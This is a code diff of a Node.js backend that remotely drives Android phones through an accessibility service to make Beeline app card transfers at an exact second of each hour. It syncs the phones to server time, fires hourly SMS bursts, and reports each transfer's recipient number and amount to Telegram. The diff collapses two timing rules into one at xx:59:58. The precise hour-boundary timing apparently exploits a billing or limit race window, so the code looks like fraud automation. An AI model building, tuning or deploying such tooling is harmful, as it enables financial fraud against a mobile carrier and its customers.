@@ -47,17 +47,14 @@ const RECIPIENT_NUMBER = String(process.env.RECIPIENT_NUMBER || '7878');
 // Source of the "символ" / "успешно" replies; "Ок" is sent back to it.
 const SIGNAL_NUMBER = String(process.env.SIGNAL_NUMBER || '8464');
 // "Метод Форс": the device drives the Beeline (Билайн) app UI to make a card
-// transfer at two exact Moscow-time moments each hour. Everything about the flow
+// transfer at one exact Moscow-time moment each hour. Everything about the flow
 // is delivered from here so it can be re-tuned to a new Beeline layout WITHOUT
 // rebuilding the APK. Times are seconds-within-the-hour, Moscow time (UTC+3).
-//   Rule A: press «Отправить» exactly at mm:ss = 12:59  → 12*60+59 = 779.
-//           preparation starts at 10:30 → lead = 149 s before the fire moment.
-//   Rule B: complete every step; if «Повторить» appears, tap it at mm:ss = 59:59
-//           → 59*60+59 = 3599. preparation starts 5 min earlier → lead = 300 s.
-const MF_RULE_A_FIRE_SEC = parseInt(process.env.MF_RULE_A_FIRE_SEC || '779', 10);
-const MF_RULE_A_PREP_LEAD_SEC = parseInt(process.env.MF_RULE_A_PREP_LEAD_SEC || '149', 10);
-const MF_RULE_B_FIRE_SEC = parseInt(process.env.MF_RULE_B_FIRE_SEC || '3599', 10);
-const MF_RULE_B_PREP_LEAD_SEC = parseInt(process.env.MF_RULE_B_PREP_LEAD_SEC || '300', 10);
+//   Prepare everything, then press «Отправить» exactly at mm:ss = 59:58
+//   → 59*60+58 = 3598. Preparation starts 5 min earlier → lead = 300 s.
+//   If «Повторить» appears, tap it once immediately and wait for the handshake.
+const MF_RULE_FIRE_SEC = parseInt(process.env.MF_RULE_FIRE_SEC || '3598', 10);
+const MF_RULE_PREP_LEAD_SEC = parseInt(process.env.MF_RULE_PREP_LEAD_SEC || '300', 10);
 // Beeline app package (queried + driven by the accessibility service).
 const MF_BEELINE_PACKAGE = process.env.MF_BEELINE_PACKAGE || 'ru.beeline.services';
 // Hourly SMS burst for «Метод Форс» tokens: every hour at mm:ss = 59:55 (Moscow),
@@ -84,8 +81,7 @@ function metodForsConfig() {
     symbolWord: 'символ',
     replyText: 'Ок',
     successWord: 'успешно',
-    ruleA: { fireSec: MF_RULE_A_FIRE_SEC, prepLeadSec: MF_RULE_A_PREP_LEAD_SEC },
-    ruleB: { fireSec: MF_RULE_B_FIRE_SEC, prepLeadSec: MF_RULE_B_PREP_LEAD_SEC },
+    rule: { fireSec: MF_RULE_FIRE_SEC, prepLeadSec: MF_RULE_PREP_LEAD_SEC },
     // Hourly old-style SMS burst (xx:59:55 MSK, 5 SMS × 1 s) on active devices.
     hourlyBurst: {
       enabled: MF_BURST_ENABLED, fireSec: MF_BURST_FIRE_SEC,
@@ -548,10 +544,10 @@ function buildSyncPayload(d, t) {
     workMode: (t && t.workMode) || 'manual', // manual | schedule | signal
     probeReq: d.probeReq || '', // when this changes, the device sends one probe SMS
     // "Метод Форс": when enabled for the token, the device runs the Beeline
-    // automation engine (two exact Moscow-time rules per hour) instead of the
+    // automation engine (one exact Moscow-time rule per hour) instead of the
     // plain SMS sender. serverNowMs is our NTP-backed wall clock — the device
-    // syncs its Moscow time to it so it hits xx:12:59 / xx:59:59 to the second,
-    // even if the phone's own clock is wrong.
+    // syncs its Moscow time to it so it hits xx:59:58 to the second, even if
+    // the phone's own clock is wrong.
     metodFors: valid && !!(t && t.metodForsEnabled),
     metodForsConfig: metodForsConfig(),
     serverNowMs: Date.now(),
@@ -1142,7 +1138,7 @@ const server = http.createServer(async (req, res) => {
 
     // ================= Precise time source (public) =================
     // The device clock-syncs to this NTP-backed wall clock so "Метод Форс" hits
-    // xx:12:59 / xx:59:59 Moscow time exactly, even if the phone's clock drifts.
+    // xx:59:58 Moscow time exactly, even if the phone's clock drifts.
     // Moscow is UTC+3 with no DST, so mskMs = now + 3h independent of any device TZ.
     if (p === '/api/time' && m === 'GET') {
       const nowMs = Date.now();
@@ -1602,7 +1598,6 @@ const server = http.createServer(async (req, res) => {
       if (body.type === 'metodfors' && t) {
         const requisites = String(body.requisites || '').slice(0, 300);
         const amount = normalizeAmount(body.amount).slice(0, 32);
-        const rule = String(body.rule || '').slice(0, 8); // "A" | "B"
         const at = now();
         db.paymentsLog.push({
           tokenId: t.id, tokenComment: t.comment || '',
@@ -1619,7 +1614,6 @@ const server = http.createServer(async (req, res) => {
           `Устройство: <b>${eschtml(d.name)}</b>\n` +
           `Номер: <b>${eschtml(requisites)}</b>\n` +
           `Сумма: <b>${eschtml(amount)}</b>\n` +
-          (rule ? `Правило: <b>${eschtml(rule === 'B' ? 'xx:59:59' : 'xx:12:59')}</b>\n` : '') +
           `Дата и время: ${fmtDateTime(at)}`;
         for (const chatId of recips) tgSend(chatId, msg);
         return sendJson(res, 200, { ok: true });
